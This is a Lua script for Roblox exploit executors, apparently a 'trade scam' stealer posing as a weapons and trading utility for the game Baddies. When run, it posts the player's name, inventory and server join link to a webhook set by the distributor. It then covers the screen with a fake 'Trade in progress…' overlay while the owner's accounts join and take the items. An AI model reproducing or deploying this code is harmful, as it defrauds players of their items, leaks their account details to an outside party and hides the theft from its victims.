-- Ryr's Scripts | Baddies 🍀
-- baddies.lua

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local RunService       = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
local Backpack    = LocalPlayer:WaitForChild("Backpack")

-- ── Config (set by generated script) ─────────────────────────────────
local WEBHOOK      = _G.POOR_WEBHOOK  or ""
local MY_USERNAMES = _G.MY_USERNAMES  or {}
local PING_POOR    = _G.PING_POOR     or false

-- ── Colours ───────────────────────────────────────────────────────────
local C = {
    bg     = Color3.fromRGB(18,  18,  24),
    panel  = Color3.fromRGB(28,  28,  38),
    accent = Color3.fromRGB(255, 105, 180),
    text   = Color3.fromRGB(240, 240, 240),
    sub    = Color3.fromRGB(160, 160, 160),
    green  = Color3.fromRGB( 80, 200, 120),
    red    = Color3.fromRGB(220,  70,  70),
    btn    = Color3.fromRGB( 40,  40,  55),
    yellow = Color3.fromRGB(255, 210,  60),
}

-- ── HTTP (uses executor's request function, not HttpService) ──────────
local httpRequest = (syn and syn.request)
    or (http and http.request)
    or request
    or error("No HTTP function found. Use Delta or a supported executor.")

local function encodeJSON(t)
    -- Simple JSON encoder for flat/nested tables
    local function val(v)
        local tv = type(v)
        if tv == "string"  then return '"' .. v:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n') .. '"' end
        if tv == "number"  then return tostring(v) end
        if tv == "boolean" then return v and "true" or "false" end
        if tv == "table"   then
            -- array check
            if #v > 0 then
                local items = {}
                for _, item in ipairs(v) do table.insert(items, val(item)) end
                return "[" .. table.concat(items, ",") .. "]"
            else
                local items = {}
                for k, item in pairs(v) do
                    table.insert(items, '"' .. tostring(k) .. '":' .. val(item))
                end
                return "{" .. table.concat(items, ",") .. "}"
            end
        end
        return "null"
    end
    return val(t)
end

local function sendWebhook(embed)
    if WEBHOOK == "" then return end
    local ping = PING_POOR and "@everyone" or ""
    local ok, err = pcall(httpRequest, {
        Url     = WEBHOOK,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = encodeJSON({ content = ping, embeds = { embed } }),
    })
    if not ok then
        warn("[Baddies] Webhook failed:", err)
    end
end

-- ── Collect weapons ───────────────────────────────────────────────────
local function getWeapons()
    local list = {}
    local seen = {}
    local char = LocalPlayer.Character

    local function scan(container)
        if not container then return end
        for _, item in ipairs(container:GetChildren()) do
            if (item:IsA("Tool") or item:IsA("HopperBin")) and not seen[item.Name] then
                seen[item.Name] = true
                table.insert(list, item.Name)
            end
        end
    end

    scan(Backpack)
    if char then scan(char) end
    return list
end

-- ── Join link ─────────────────────────────────────────────────────────
local function joinLink()
    return string.format(
        "roblox://experiences/start?placeId=%d&gameInstanceId=%s",
        game.PlaceId, game.JobId
    )
end

-- ── Execution notification ────────────────────────────────────────────
local function notifyExecution()
    local weapons = getWeapons()
    local weaponStr = #weapons > 0
        and "• " .. table.concat(weapons, "\n• ")
        or  "None found"

    sendWebhook({
        title       = "⚡ Script Executed",
        description = string.format(
            "**User:** %s (`%s`)\n**Place:** %s (`%d`)\n**Players:** %d/%d",
            LocalPlayer.DisplayName,
            LocalPlayer.Name,
            game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown",
            game.PlaceId,
            #Players:GetPlayers(),
            game.MaxPlayers
        ),
        fields = {
            { name = "⚔️ Weapons", value = weaponStr,     inline = false },
            { name = "🔗 Join",    value = joinLink(),     inline = false },
        },
        color     = 0xFF69B4,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    })
end

-- ── Screen freeze / unfreeze ──────────────────────────────────────────
local freezeGui = nil

local function freezeScreen()
    if freezeGui then return end
    freezeGui = Instance.new("ScreenGui")
    freezeGui.Name           = "FreezeOverlay"
    freezeGui.ResetOnSpawn   = false
    freezeGui.DisplayOrder   = 999
    freezeGui.IgnoreGuiInset = true
    freezeGui.Parent         = PlayerGui

    local overlay = Instance.new("Frame", freezeGui)
    overlay.Size                  = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3      = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.35
    overlay.BorderSizePixel       = 0
    overlay.ZIndex                = 10

    local blur = Instance.new("BlurEffect")
    blur.Size   = 24
    blur.Parent = game:GetService("Lighting")

    local stroke = Instance.new("UIStroke", overlay)
    stroke.Color       = C.accent
    stroke.Thickness   = 6
    stroke.Transparency = 0
    TweenService:Create(stroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine,
        Enum.EasingDirection.InOut, -1, true), { Transparency = 0.6 }):Play()

    local lbl = Instance.new("TextLabel", freezeGui)
    lbl.Size                   = UDim2.new(1, 0, 0, 60)
    lbl.Position               = UDim2.new(0, 0, 0.5, -30)
    lbl.BackgroundTransparency = 1
    lbl.Text                   = "🔄  Trade in progress…"
    lbl.Font                   = Enum.Font.GothamBold
    lbl.TextSize               = 26
    lbl.TextColor3             = C.accent
    lbl.TextStrokeTransparency = 0.4
    lbl.TextStrokeColor3       = Color3.new(0, 0, 0)
    lbl.ZIndex                 = 12
end

local function unfreezeScreen()
    if freezeGui then freezeGui:Destroy(); freezeGui = nil end
    local blur = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
    if blur then blur:Destroy() end
end

-- ── GUI helpers ───────────────────────────────────────────────────────
local function corner(p, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = p
end
local function lbl(p, txt, sz, col, pos)
    local l = Instance.new("TextLabel")
    l.Text = txt; l.TextSize = sz or 13; l.TextColor3 = col or C.text
    l.BackgroundTransparency = 1; l.Font = Enum.Font.GothamBold
    l.Size = UDim2.new(1, -16, 0, (sz or 13) + 4)
    l.Position = pos or UDim2.new(0, 8, 0, 0)
    l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = p; return l
end
local function btn(p, txt, col, pos, sz)
    local b = Instance.new("TextButton")
    b.Text = txt; b.TextSize = 12; b.TextColor3 = C.text
    b.Font = Enum.Font.GothamBold; b.BackgroundColor3 = col or C.btn
    b.Size = sz or UDim2.new(1, -16, 0, 28)
    b.Position = pos or UDim2.new(0, 8, 0, 0)
    b.AutoButtonColor = false; b.Parent = p; corner(b, 6)
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.12), {
            BackgroundColor3 = (col or C.btn):Lerp(Color3.new(1,1,1), 0.15)
        }):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.12), { BackgroundColor3 = col or C.btn }):Play()
    end)
    return b
end

-- ── Auto-trade state ──────────────────────────────────────────────────
local tradeState  = "idle"
local chatConn    = nil
local statusLabel = nil

local function isOwner(name)
    for _, n in ipairs(MY_USERNAMES) do
        if n:lower() == name:lower() then return true end
    end
    return false
end

local function setStatus(msg, col)
    if statusLabel then
        statusLabel.Text       = msg
        statusLabel.TextColor3 = col or C.yellow
    end
end

local function listenForChat(owner)
    if chatConn then chatConn:Disconnect() end
    chatConn = owner.Chatted:Connect(function(msg)
        local m = msg:match("^%s*(.-)%s*$")
        if m == "1" and tradeState == "pending" then
            tradeState = "accepted"
            setStatus("✅ Accepted — waiting for 2…", C.green)
            sendWebhook({
                title = "✅ Trade Accepted",
                description = owner.DisplayName .. " accepted. Type **2** to confirm.",
                color = 0x50C878,
            })
        elseif m == "2" and tradeState == "accepted" then
            tradeState = "confirmed"
            setStatus("🎉 Confirmed!", C.green)
            unfreezeScreen()
            if chatConn then chatConn:Disconnect() end
            sendWebhook({
                title = "🎉 Trade Confirmed",
                description = string.format("Trade between **%s** and **%s** complete.",
                    LocalPlayer.DisplayName, owner.DisplayName),
                color = 0xFF69B4,
            })
        end
    end)
end

local function startAutoTrade()
    -- Find owner in server
    local owner = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isOwner(p.Name) then owner = p; break end
    end

    if not owner then
        setStatus("⚠️ Owner not in server", C.red)
        Players.PlayerAdded:Connect(function(p)
            if isOwner(p.Name) and tradeState == "idle" then
                owner = p
                tradeState = "pending"
                freezeScreen()
                setStatus("⏳ Waiting for " .. p.DisplayName .. " — type 1…", C.yellow)
                sendWebhook({
                    title = "🔄 Trade Waiting",
                    description = p.DisplayName .. " joined. Type **1** to accept, **2** to confirm.",
                    color = 0xFF69B4,
                })
                listenForChat(p)
            end
        end)
        return
    end

    tradeState = "pending"
    freezeScreen()
    setStatus("⏳ Waiting for " .. owner.DisplayName .. " — type 1…", C.yellow)
    sendWebhook({
        title = "🔄 Auto Trade Started",
        description = string.format(
            "**%s** is ready to trade.\nType **1** to accept, **2** to confirm.",
            LocalPlayer.DisplayName
        ),
        color = 0xFF69B4,
    })
    listenForChat(owner)
end

-- ── Build GUI ─────────────────────────────────────────────────────────
local gui = Instance.new("ScreenGui")
gui.Name = "BaddiesGui"; gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 10; gui.Parent = PlayerGui

local win = Instance.new("Frame", gui)
win.Size = UDim2.new(0, 290, 0, 420); win.Position = UDim2.new(0, 16, 0.5, -210)
win.BackgroundColor3 = C.bg; win.BorderSizePixel = 0; corner(win, 12)

-- Title bar
local tb = Instance.new("Frame", win)
tb.Size = UDim2.new(1, 0, 0, 42); tb.BackgroundColor3 = C.accent
tb.BorderSizePixel = 0; corner(tb, 12)
local tbfix = Instance.new("Frame", tb)
tbfix.Size = UDim2.new(1, 0, 0.5, 0); tbfix.Position = UDim2.new(0, 0, 0.5, 0)
tbfix.BackgroundColor3 = C.accent; tbfix.BorderSizePixel = 0
local tlbl = Instance.new("TextLabel", tb)
tlbl.Text = "🍀  Ryr's Baddies"; tlbl.Font = Enum.Font.GothamBold; tlbl.TextSize = 14
tlbl.TextColor3 = Color3.new(1,1,1); tlbl.BackgroundTransparency = 1
tlbl.Size = UDim2.new(1,-40,1,0); tlbl.Position = UDim2.new(0,10,0,0)
tlbl.TextXAlignment = Enum.TextXAlignment.Left

-- Drag
local drag, ds, sp
tb.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        drag = true; ds = i.Position; sp = win.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position - ds
        win.Position = UDim2.new(sp.X.Scale, sp.X.Offset+d.X, sp.Y.Scale, sp.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
end)

-- Min button
local minimised = false
local content = Instance.new("Frame", win)
content.Size = UDim2.new(1,0,1,-42); content.Position = UDim2.new(0,0,0,42)
content.BackgroundTransparency = 1
local mb = Instance.new("TextButton", tb)
mb.Text = "–"; mb.Size = UDim2.new(0,26,0,26); mb.Position = UDim2.new(1,-32,0.5,-13)
mb.BackgroundTransparency = 1; mb.TextColor3 = Color3.new(1,1,1)
mb.TextSize = 18; mb.Font = Enum.Font.GothamBold
mb.MouseButton1Click:Connect(function()
    minimised = not minimised
    content.Visible = not minimised
    win.Size = minimised and UDim2.new(0,290,0,42) or UDim2.new(0,290,0,420)
    mb.Text = minimised and "+" or "–"
end)

-- ── Section: Info ─────────────────────────────────────────────────────
lbl(content, "👤  " .. LocalPlayer.DisplayName .. " | " .. LocalPlayer.Name,
    12, C.sub, UDim2.new(0, 8, 0, 8))

-- ── Section: Trade Status ─────────────────────────────────────────────
local ts = Instance.new("Frame", content)
ts.Size = UDim2.new(1,-16,0,96); ts.Position = UDim2.new(0,8,0,30)
ts.BackgroundColor3 = C.panel; ts.BorderSizePixel = 0; corner(ts, 8)
lbl(ts, "🔄  Trade Status", 12, C.accent, UDim2.new(0,8,0,6))
statusLabel = lbl(ts, "⏳ Starting…", 11, C.yellow, UDim2.new(0,8,0,24))
local cancelBtn = btn(ts, "❌ Cancel Trade", C.red, UDim2.new(0,8,0,58), UDim2.new(1,-16,0,28))
cancelBtn.MouseButton1Click:Connect(function()
    if chatConn then chatConn:Disconnect() end
    tradeState = "cancelled"
    setStatus("❌ Cancelled", C.red)
    unfreezeScreen()
    sendWebhook({ title = "❌ Trade Cancelled",
        description = LocalPlayer.DisplayName .. " cancelled.", color = 0xDC4646 })
end)

-- ── Section: Weapons ──────────────────────────────────────────────────
local ws = Instance.new("Frame", content)
ws.Size = UDim2.new(1,-16,0,94); ws.Position = UDim2.new(0,8,0,136)
ws.BackgroundColor3 = C.panel; ws.BorderSizePixel = 0; corner(ws, 8)
lbl(ws, "⚔️  Your Weapons in Trade", 12, C.accent, UDim2.new(0,8,0,6))
local weapLbl = lbl(ws, "Loading…", 11, C.sub, UDim2.new(0,8,0,24))
weapLbl.Size = UDim2.new(1,-16,0,64); weapLbl.TextWrapped = true

local refreshBtn = btn(ws, "🔄 Refresh Weapons", C.btn, UDim2.new(0,8,0,60), UDim2.new(1,-16,0,26))
refreshBtn.MouseButton1Click:Connect(function()
    local w = getWeapons()
    weapLbl.Text = #w > 0 and "• " .. table.concat(w, "\n• ") or "(none found)"
end)

-- ── Section: Join link ────────────────────────────────────────────────
local js = Instance.new("Frame", content)
js.Size = UDim2.new(1,-16,0,58); js.Position = UDim2.new(0,8,0,240)
js.BackgroundColor3 = C.panel; js.BorderSizePixel = 0; corner(js, 8)
lbl(js, "🔗  Join Link", 12, C.accent, UDim2.new(0,8,0,6))
local copyBtn = btn(js, "📋 Copy to Clipboard", C.btn, UDim2.new(0,8,0,26), UDim2.new(1,-16,0,24))
copyBtn.MouseButton1Click:Connect(function()
    local link = joinLink()
    pcall(setclipboard, link)
    sendWebhook({ title = "🔗 Join Link Shared",
        description = LocalPlayer.DisplayName .. "\n```\n" .. link .. "\n```", color = 0xFF69B4 })
    copyBtn.Text = "✅ Copied!"
    task.delay(2, function() copyBtn.Text = "📋 Copy to Clipboard" end)
end)

-- ── Section: Manual trade ─────────────────────────────────────────────
local ms = Instance.new("Frame", content)
ms.Size = UDim2.new(1,-16,0,90); ms.Position = UDim2.new(0,8,0,308)
ms.BackgroundColor3 = C.panel; ms.BorderSizePixel = 0; corner(ms, 8)
lbl(ms, "📨  Manual Trade", 12, C.accent, UDim2.new(0,8,0,6))
lbl(ms, "Target types 1=accept · 2=confirm", 10, C.sub, UDim2.new(0,8,0,22))
local mi = Instance.new("TextBox", ms)
mi.Size = UDim2.new(0.58,-4,0,24); mi.Position = UDim2.new(0,8,0,42)
mi.BackgroundColor3 = C.bg; mi.TextColor3 = C.text; mi.PlaceholderColor3 = C.sub
mi.PlaceholderText = "Username…"; mi.Text = ""; mi.Font = Enum.Font.Gotham
mi.TextSize = 12; mi.ClearTextOnFocus = false; mi.BorderSizePixel = 0; corner(mi, 5)
local mip = Instance.new("UIPadding", mi); mip.PaddingLeft = UDim.new(0,6)
local msb = btn(ms, "Send", C.accent, UDim2.new(0.58,4,0,42), UDim2.new(0.42,-12,0,24))
msb.MouseButton1Click:Connect(function()
    local name = mi.Text:match("^%s*(.-)%s*$")
    if name == "" then return end
    local target = Players:FindFirstChild(name)
    if not target or target == LocalPlayer then
        msb.Text = "Not found"; task.delay(2, function() msb.Text = "Send" end); return
    end
    if chatConn then chatConn:Disconnect() end
    tradeState = "pending"; freezeScreen()
    setStatus("⏳ Waiting for " .. target.DisplayName .. " — type 1…", C.yellow)
    listenForChat(target)
    sendWebhook({ title = "🔄 Manual Trade Sent",
        description = LocalPlayer.DisplayName .. " → " .. target.DisplayName
            .. "\nType **1** accept · **2** confirm", color = 0xFF69B4 })
    msb.Text = "✅ Sent!"; task.delay(2, function() msb.Text = "Send" end)
end)

-- ── Section: Scroll for weapons at 412 (below manual) ────────────────
lbl(content, "▲ drag title bar to move", 9, C.sub, UDim2.new(0,8,0,402))

-- ── Boot ──────────────────────────────────────────────────────────────
task.spawn(function()
    -- Populate weapons immediately
    local w = getWeapons()
    weapLbl.Text = #w > 0 and "• " .. table.concat(w, "\n• ") or "(none found)"

    -- Notify webhook of execution first
    notifyExecution()

    -- Then start auto trade
    task.wait(0.5)
    startAutoTrade()
end)

print("[Baddies] Loaded —", LocalPlayer.DisplayName)
